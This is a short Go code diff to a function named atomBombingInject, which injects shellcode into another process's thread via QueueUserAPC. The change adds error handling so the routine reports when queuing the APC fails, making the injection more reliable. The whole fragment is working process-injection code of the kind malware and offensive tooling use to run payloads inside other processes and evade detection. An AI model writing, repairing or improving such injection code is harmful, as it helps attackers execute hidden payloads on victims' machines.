@@ -93,8 +93,11 @@ func atomBombingInject(pid uint32, shellcode []byte) error {
 				0, uintptr(te.th32ThreadID),
 			)
 			if hThread != 0 {
-				procQueueUserAPC.Call(remoteAddr, hThread, 0)
+				queued, _, _ := procQueueUserAPC.Call(remoteAddr, hThread, 0)
 				procCloseHandle.Call(hThread)
+				if queued == 0 {
+					return fmt.Errorf("atom bombing: QueueUserAPC failed on thread %d", te.th32ThreadID)
+				}
 				return nil
 			}
 		}
